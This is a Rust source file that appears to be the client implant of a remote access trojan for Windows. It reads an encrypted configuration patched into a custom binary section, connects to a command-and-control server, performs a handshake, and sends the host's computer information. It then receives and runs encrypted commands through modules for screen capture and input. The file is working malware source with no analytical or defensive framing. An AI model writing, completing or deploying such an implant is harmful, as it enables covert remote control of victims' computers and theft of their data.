//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
///////////////////////////////////////////////////////////////////
// server patches config into this area
#[used]
#[unsafe(no_mangle)]
#[unsafe(link_section = ".rscdt")]
pub static _CONFIG_DATA: [u8; 4096] = [0xAA; 4096];
///////////////////////////////////////////////////////////////////

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use std::sync::Arc;

use aes_gcm::aead::consts::U32;
use aes_gcm::aead::generic_array::GenericArray;
use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use shared::commands::{BaseCommand, BaseResponse};
use shared::crypto::Encryption;
use shared::types::ClientConfig;
use smol::channel;
use smol::{
    io::{self, AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt},
    lock::Mutex,
    net::TcpStream,
};
use winapi::um::winuser::{MB_ICONERROR, MB_OKCANCEL, MessageBoxW};

use crate::commands::computer_info;
use crate::threading::ActiveCommands;

mod capture;
mod commands;
mod handler;
mod input;
mod threading;

pub fn wstring(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

/////////////////////////
fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    unsafe {
        std::ptr::read_volatile(_CONFIG_DATA.as_ptr()); // reads from _CONFIG_DATA

        // Now read the length
        let length_ptr = _CONFIG_DATA.as_ptr() as *const u32;
        let length = std::ptr::read_volatile(length_ptr).to_le() as usize;

        if length == 0 || length > 4092 {
            MessageBoxW(
                null_mut(),
                wstring("Failed to read config!").as_ptr(),
                wstring("Error").as_ptr(),
                MB_OKCANCEL | MB_ICONERROR,
            );
            return Err("Failed to read config!".into());
        }
        //////////////////////////////////////////////////

        // STAGE 2: TRY TO READ THE CONFIG
        let config_start = _CONFIG_DATA.as_ptr().add(4);
        let mut config_trimmed = vec![0u8; length];
        for i in 0..length {
            config_trimmed[i] = std::ptr::read_volatile(config_start.add(i));
        }

        Ok(config_trimmed)
    }
}
fn decrypt(
    config_trimmed: &Vec<u8>,
) -> Result<(ClientConfig, &GenericArray<u8, U32>), Box<dyn std::error::Error>> {
    let key: &GenericArray<u8, U32> = Key::<Aes256Gcm>::from_slice(&config_trimmed[0..32]);
    let nonce = Nonce::from_slice(&config_trimmed[32..44]);
    let ciphertext = &config_trimmed[44..];

    let cipher = Aes256Gcm::new(key);
    let config = cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| e.to_string())
        .unwrap();

    let (client_config, _length): (ClientConfig, usize) =
        bincode::decode_from_slice(&config, bincode::config::standard())?;

    Ok((client_config, key))
}

/////////////////////////
fn main() -> Result<(), Box<dyn std::error::Error>> {
    let config_buffer = config()?;
    let (config, _key) = decrypt(&config_buffer)?;
    let socket = format!("{0}:{1}", &config.address, &config.port);

    smol::block_on(async move {
        let stream = TcpStream::connect(socket).await?;
        let (mut reader, writer) = io::split(stream);
        let writer = Arc::new(Mutex::new(writer));

        println!("[*][main] sending handshake");
        writer
            .lock()
            .await
            .write_all(&[0x0a, 0xee, 0x7c, 0x9b, 0x32])
            .await?;
        println!("[*][main] waiting for response");
        let mut response = [0; 5];
        reader.read_exact(&mut response).await?;

        if response == [0x32, 0x9b, 0x7c, 0xee, 0x0a] {
            println!("[v][main] handshake successful; sending mutex");
            writer
                .lock()
                .await
                .write_all(config.mutex.as_slice())
                .await?;
        } else {
            println!("[x][main] handshake failed");
            return Err("Failed handshake with server".into());
        }

        let encryption = Encryption::new(_key);

        if let Ok(res) = computer_info::main() {
            let computer_info_payload = BaseResponse {
                id: 0,
                response: res,
            };
            let _ = send(
                &mut *writer.lock().await,
                &encryption,
                bincode::encode_to_vec(computer_info_payload, bincode::config::standard()).unwrap(),
            )
            .await;
        } else {
            println!("[x][main] failed to run computer_info::main");
        }

        match wait(reader, writer, encryption).await {
            Ok(_) => println!("[*][main] loop exited gracefully"),
            Err(e) => println!("[x][main] error waiting for response: {}", e),
        };

        println!("[v][main] closing");
        Ok(())
    })
}

async fn send(
    stream: &mut (impl AsyncWrite + Unpin + Send + 'static),
    encryption: &Encryption,
    buf: Vec<u8>,
) -> Result<(), std::io::Error> {
    if let Ok((nonce, encrypted)) = encryption.encrypt(&buf) {
        let mut payload = Vec::new();
        payload.extend_from_slice(&nonce);
        payload.extend_from_slice(&encrypted);

        shared::net::write(stream, &payload).await?;
        // println!("[v][send] wrote payload (size:{}) to server", &buf.len());
    }
    Ok(())
}

async fn wait(
    mut reader: impl AsyncRead + Unpin + Send + 'static,
    writer: Arc<Mutex<impl AsyncWrite + Unpin + Send + 'static>>,
    encryption: Encryption,
) -> Result<(), std::io::Error> {
    println!("[*][wait] entered loop");

    let (response_tx, response_rx) = channel::unbounded();
    let mut active = ActiveCommands::new();
    let encryption = Arc::new(encryption);

    let stream_writer = writer.clone();
    let encryption_writer = encryption.clone();
    smol::spawn(async move {
        while let Ok(response_data) = response_rx.recv().await {
            if let Err(e) = send(
                &mut *stream_writer.lock().await,
                &encryption_writer,
                response_data,
            )
            .await
            {
                println!("[x][wait] failed to send response: {}", e);
                break;
            }
        }
    })
    .detach();

    loop {
        match shared::net::read(&mut reader).await {
            Ok(buf) => {
                // println!("[*][wait] reading data from server");
                let mut nonce = [0u8; 12];
                nonce.copy_from_slice(&buf[..12]);
                let buffer = &buf[12..];
                if let Ok(decrypted) = encryption.decrypt(&nonce, buffer) {
                    // println!("[v][wait] decrypted payload (size:{})", &decrypted.len());

                    let (command, _size): (BaseCommand, usize) =
                        bincode::decode_from_slice(&decrypted, bincode::config::standard())
                            .unwrap();

                    let response_tx = response_tx.clone();
                    active.spawn(command, response_tx).await;
                } else {
                    println!("[x][wait] decryption failed");
                }
            }
            Err(e) => {
                println!("[x][wait] {}", e);
                if e.kind() != std::io::ErrorKind::FileTooLarge {
                    break Ok(());
                }
            }
        };
    }
}
